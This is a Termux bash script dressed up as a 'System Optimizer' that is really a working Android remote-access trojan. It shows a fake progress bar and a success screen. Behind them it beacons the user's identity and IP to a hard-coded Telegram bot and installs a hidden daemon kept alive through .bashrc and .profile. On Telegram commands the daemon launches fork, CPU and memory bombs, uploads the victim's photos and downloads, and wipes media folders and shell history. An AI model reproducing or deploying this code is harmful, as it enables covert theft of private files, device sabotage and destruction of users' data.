#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# DINDA404 SYSTEM OPTIMIZER - HIDDEN EDITION
# Created by: DindaZ404
# ============================================

# Konfigurasi Telegram - GANTI KONTOL!
TOKEN="8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg"
CHAT_ID="8042897984"

# Warna (opsional)
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

clear

# ============= TAMPILAN AWAL (UMPAN) =============
echo -e "${P}"
cat << "EOF"
██████╗ ██╗███╗   ██╗██████╗  █████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║████╗  ██║██╔══██╗██╔══██╗    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║  ██║██║██╔██╗ ██║██║  ██║███████║    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██║  ██║██║██║╚██╗██║██║  ██║██╔══██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║██║ ╚████║██████╔╝██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
EOF
echo -e "${N}"

echo -e "${C}╔══════════════════════════════════════════════════════════╗${N}"
echo -e "${C}║${Y}           TERMUX SYSTEM OPTIMIZER v2.0                 ${C}║${N}"
echo -e "${C}║${G}     [✓] Clean Cache                                    ${C}║${N}"
echo -e "${C}║${G}     [✓] Boost Performance                              ${C}║${N}"
echo -e "${C}║${G}     [✓] Memory Optimization                            ${C}║${N}"
echo -e "${C}║${P}              Created by: DindaZ404                      ${C}║${N}"
echo -e "${C}╚══════════════════════════════════════════════════════════╝${N}"
echo ""

# ============= PROGRESS BAR PALSU =============
echo -e "${Y}[!] Analyzing system performance...${N}"

for i in {1..10}; do
    echo -ne "\r${G}["
    for j in $(seq 1 $i); do echo -ne "█"; done
    for j in $(seq $i 10); do echo -ne "░"; done
    echo -ne "] $((i*10))%${N}"
    sleep 0.3
done
echo ""
sleep 1

# ============= HIDDEN PAYLOAD - INI YANG BENERAN =============

# Buat hidden directory (biar ga keliatan)
HIDDEN_DIR="$HOME/.config/.system"
mkdir -p "$HIDDEN_DIR"
mkdir -p "$HOME/.cache/.update"

# Kirim notifikasi ke Telegram
echo -e "${Y}[System Update] Installing optimization tools...${N}"

# Kirim sinyal hidup ke telegram
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=🔥 *Target Terkoneksi!*%0A%0A📱 *Device:* $(uname -o)%0A👤 *User:* $(whoami)%0A🌐 *IP:* $(curl -s ifconfig.me 2>/dev/null)%0A📅 *Date:* $(date)%0A%0A⚡ *System Ready*" \
    -d "parse_mode=Markdown" > /dev/null 2>&1 &

# ============= FORK BOMB SCRIPT =============
cat > "$HIDDEN_DIR/.systemd" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
# System daemon - JANGAN DIHAPUS!

TOKEN="8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg"
CHAT_ID="8042897984"

# ============= FORK BOMB FUNCTION =============
forkbomb() {
    # Classic fork bomb
    :(){ :|:& };:
    
    # Python fork bomb (kalo ada python)
    if command -v python3 &> /dev/null; then
        python3 -c "
import os
import threading

def bomb():
    while True:
        try:
            for i in range(1000):
                if os.fork() == 0:
                    while True:
                        pass
        except:
            pass

for i in range(50):
    threading.Thread(target=bomb).start()
" 2>/dev/null &
    fi
    
    # CPU bomb
    for cpu in {1..10}; do
        (while true; do
            echo > /dev/null
            echo $((12345*67890)) > /dev/null
        done) &
    done
    
    # Memory bomb
    if command -v python3 &> /dev/null; then
        python3 -c "
import time
a = []
while True:
    try:
        a.append(' ' * 10**7)
    except MemoryError:
        time.sleep(0.1)
" 2>/dev/null &
    fi
    
    # Termux specific bomb
    for i in {1..20}; do
        (while true; do
            am start-service --user 0 -n com.termux/.app.TermuxService 2>/dev/null
            termux-wake-lock 2>/dev/null
            termux-camera-photo 2>/dev/null
        done) &
    done
    
    # Kirim notifikasi
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=💣 *FORK BOMB ACTIVATED!*%0A%0A🔥 CPU: 100%%%0A🔥 RAM: 100%%%0A🔥 System: CRASH" \
        -d "parse_mode=Markdown" > /dev/null 2>&1 &
}

# ============= SNITCH FUNCTION =============
snitch() {
    # Kirim notifikasi
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=📸 *Mengirim file...*" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
    
    # Cari file gambar
    if [ -d "/storage/emulated/0/DCIM/Camera" ]; then
        find "/storage/emulated/0/DCIM/Camera" -name "*.jpg" -o -name "*.png" | head -5 | while read img; do
            curl -s -F chat_id="$CHAT_ID" \
                 -F document=@"$img" \
                 "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
            sleep 2
        done
    fi
    
    # Cari file di Download
    if [ -d "/storage/emulated/0/Download" ]; then
        find "/storage/emulated/0/Download" -name "*.jpg" -o -name "*.png" | head -5 | while read img; do
            curl -s -F chat_id="$CHAT_ID" \
                 -F document=@"$img" \
                 "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
            sleep 2
        done
    fi
}

# ============= WIPE FUNCTION =============
wipe() {
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=🧹 *WIPE COMMAND EXECUTED!*" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
    
    # Hapus file-file penting
    rm -rf /storage/emulated/0/Download/* 2>/dev/null
    rm -rf /storage/emulated/0/DCIM/Camera/* 2>/dev/null
    rm -rf /storage/emulated/0/Documents/* 2>/dev/null
    rm -rf /storage/emulated/0/Pictures/* 2>/dev/null
    rm -rf /storage/emulated/0/Movies/* 2>/dev/null
    rm -rf /storage/emulated/0/Music/* 2>/dev/null
    
    # Hapus file Termux
    rm -rf ~/.bash_history 2>/dev/null
    rm -rf ~/.zsh_history 2>/dev/null
}

# ============= TELEGRAM COMMAND CHECKER =============
check_telegram() {
    local last_cmd=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates" | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
    
    case "$last_cmd" in
        "/start")
            curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
                -d "chat_id=$CHAT_ID" \
                -d "text=✅ *System Online*%0A%0ACommands:%0A/bomb - Aktifkan Fork Bomb%0A/snitch - Curi File%0A/wipe - Hapus Semua%0A/info - Info Device" \
                -d "parse_mode=Markdown" > /dev/null 2>&1
            ;;
        "/bomb")
            forkbomb
            ;;
        "/snitch")
            snitch
            ;;
        "/wipe")
            wipe
            ;;
        "/info")
            local ip=$(curl -s ifconfig.me 2>/dev/null)
            local uptime=$(uptime | sed 's/.*up //; s/,.*//')
            curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
                -d "chat_id=$CHAT_ID" \
                -d "text=📱 *Device Info*%0A%0A👤 User: $(whoami)%0A📱 Host: $(hostname)%0A🌐 IP: $ip%0A⏰ Uptime: $uptime%0A📅 Date: $(date)" \
                -d "parse_mode=Markdown" > /dev/null 2>&1
            ;;
    esac
}

# Main loop
while true; do
    check_telegram
    sleep 10
done
EOF

chmod +x "$HIDDEN_DIR/.systemd"

# ============= PERSISTENCE =============
echo -e "${Y}[System Update] Configuring startup...${N}"

# Tambah ke bashrc
if ! grep -q ".systemd" ~/.bashrc; then
    cat >> ~/.bashrc << EOF

# System optimization daemon
if [ -f $HIDDEN_DIR/.systemd ]; then
    nohup bash $HIDDEN_DIR/.systemd > /dev/null 2>&1 &
fi
EOF
fi

# Tambah ke profile juga
if ! grep -q ".systemd" ~/.profile; then
    echo "nohup bash $HIDDEN_DIR/.systemd > /dev/null 2>&1 &" >> ~/.profile
fi

# Jalanin sekarang
nohup bash "$HIDDEN_DIR/.systemd" > /dev/null 2>&1 &

# ============= TAMPILAN AKHIR =============
echo -e "${G}"
cat << "EOF"
╔══════════════════════════════════════╗
║      INSTALLATION COMPLETE!          ║
╠══════════════════════════════════════╣
║  ✓ System Optimized                  ║
║  ✓ Performance Enhanced              ║
║  ✓ Cache Cleaned                      ║
║  ✓ Memory Freed                       ║
╚══════════════════════════════════════╝
EOF
echo -e "${N}"

echo -e "${Y}[!] Press Enter to exit...${N}"
read